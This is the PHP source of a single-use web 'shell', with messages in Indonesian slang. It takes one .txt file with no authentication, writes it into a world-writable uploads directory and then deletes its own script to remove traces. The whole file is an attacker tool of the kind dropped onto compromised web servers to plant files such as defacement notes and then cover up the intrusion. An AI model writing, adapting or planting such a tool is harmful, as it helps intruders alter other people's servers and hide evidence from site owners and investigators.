<?php
if (isset($_POST["submit"])) {
    
    $target_dir = "uploads/";

    
    if (!is_dir($target_dir)) {
        mkdir($target_dir, 0777, true);
    }

    $file_name = basename($_FILES["fileToUpload"]["name"]);
    $target_file = $target_dir . $file_name;
    $uploadOk = 1;
    $fileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

    
    if($fileType != "txt") {
        echo "❌ **GAK BISA, ONLY TXT YA BRO**";
        $uploadOk = 0;
    }

    
    if ($uploadOk == 0) {
        echo "<br>🚫 Gak Ke Upload";
    } else {
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            echo "✅ **Done** file ". htmlspecialchars($file_name). " telah berhasil diunggah";
            echo "<br>Dah Ya Otw Bundir";

            
            if (unlink(__FILE__)) {
                echo "<br>💣 **Done Bundir!** Shell upload telah terhapus.";
            } else {
                echo "<br>⚠️ **Waduh Gak Kehapus Brok!** Cek izin file/folder.";
            }
        } else {
            echo "❌ Yah Gagal Upload";
        }
    }
    
    exit;
}

?>

<!DOCTYPE html>
<html>
<head>
    <title>Shell Upload .TXT Sekali Pakai</title>
</head>
<body>

<h2>Shell Upload .TXT (Self-Destruct)</h2>
<p>Hanya bisa upload file **.txt** satu kali. Setelah berhasil, file ini akan menghapus dirinya sendiri.</p>

<form action="" method="post" enctype="multipart/form-data">
  Pilih file .txt:
  <input type="file" name="fileToUpload" id="fileToUpload" accept=".txt" required>
  <input type="submit" value="Upload Button" name="submit">
</form>

</body>
</html>
